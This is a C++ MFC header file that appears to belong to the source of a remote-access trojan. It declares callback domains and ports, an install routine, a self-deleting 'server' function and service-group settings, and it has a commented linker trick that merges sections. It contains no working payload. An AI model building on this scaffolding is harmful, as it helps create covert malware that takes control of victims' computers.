// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__DB9E4F27_0B93_4AB3_B3B7_35B3E4E2C9AF__INCLUDED_)
#define AFX_STDAFX_H__DB9E4F27_0B93_4AB3_B3B7_35B3E4E2C9AF__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers
////////////////////////////////////////////////
//#pragma comment(linker, "/opt:nowin98 /IGNORE:4078 /MERGE:.rdata=.text /MERGE:.data=.text /section:.text,ERW") //区段合并

///////////////////////////////////////////////////////////////////////////////

#include <afxwin.h>

extern WORD    Installope;  //安装运行
extern UINT	   nConnect;
extern LPCTSTR lpConnects[3];  //上线域名
extern DWORD   dwPort[3];     //上线端口

void DelSelf(BOOL FHshanchu);   //删除服务端函数定义
void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName);  //修改分组
int memfind(const char *mem, const char *str, int sizem, int sizes);


#endif // !defined(AFX_STDAFX_H__DB9E4F27_0B93_4AB3_B3B7_35B3E4E2C9AF__INCLUDED_)
